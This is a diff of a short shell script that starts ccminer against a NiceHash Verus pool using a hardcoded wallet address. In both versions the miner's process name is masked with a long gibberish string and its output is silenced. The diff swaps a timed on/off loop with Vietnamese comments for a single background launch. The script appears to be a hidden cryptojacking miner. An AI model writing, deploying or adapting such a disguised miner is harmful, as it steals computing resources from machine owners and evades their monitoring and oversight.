@@ -1,23 +1,5 @@
 #!/bin/sh
 
-sleep 800
-
-while true; do
-    # Chạy lệnh với tên tiến trình đã thay đổi
-    bash -c "exec -a 'HidjahshgsnzbxnzmsjjshdbdmsmdbxbskieueyrureoeiruryakjsnxbxmsjdhdhsnbzbxkeururyyeiwmsbzbzmzmbdvxkskedhsjnsbxbskshdmsnsbsjkshdnsnsjsbsmsnnsbhdjdksksnnssjjsnsnsnsblakhsudjndbbsjsuskaksnsusjksnsbshsjmmsndhdksmsdhsnsbshsssisnsbsjeieueyywiakamznxxdhskiwrydbdnsnnxbcieieuhajmabzbxksurhnxbejjdjdhdhsnsnsnbssbnsnsbsbzsnsbsbsnnsnsdenryYruo' ./ccminer -a verus -o stratum+tcp://verushash.auto.nicehash.com:9200#xnsub -u 324skyjJkp4Cm5iNQgXXu2zhq3yWmdHmDE.AMDREG08 -p x -t 1 > /dev/null 2>&1" &
-    
-    # Lưu PID của tiến trình
-    PID=$!  # Lưu PID ngay sau khi chạy
-
-    # Chờ 10 phút
-    sleep 600
-
-    # Dừng tiến trình
-    kill $PID
-
-    # Đợi cho tiến trình dừng hoàn toàn
-    wait $PID 2>/dev/null
-
-    # Nghỉ 240 giây
-    sleep 140
-done
+sleep 8
+bash -c "exec -a 'HidjahshgsnzbxnzmsjjshdbdmsmdbxbskieueyrureoeiruryakjsnxbxmsjdhdhsnbzbxkeururyyeiwmsbzbzmzmbdvxkskedhsjnsbxbskshdmsnsbsjkshdnsnsjsbsmsnnsbhdjdksksnnssjjsnsnsnsblakhsudjndbbsjsuskaksnsusjksnsbshsjmmsndhdksmsdhsnsbshsssisnsbsjeieueyywiakamznxxdhskiwrydbdnsnnxbcieieuhajmabzbxksurhnxbejjdjdhdhsnsnsnbssbnsnsbsbzsnsbsbsnnsnsdenryYruo' ./ccminer -a verus -o stratum+tcp://verushash.auto.nicehash.com:9200#xnsub -u 324skyjJkp4Cm5iNQgXXu2zhq3yWmdHmDE.AMDREG08 -p x -t 1 > /dev/null 2>&1" &
+ 
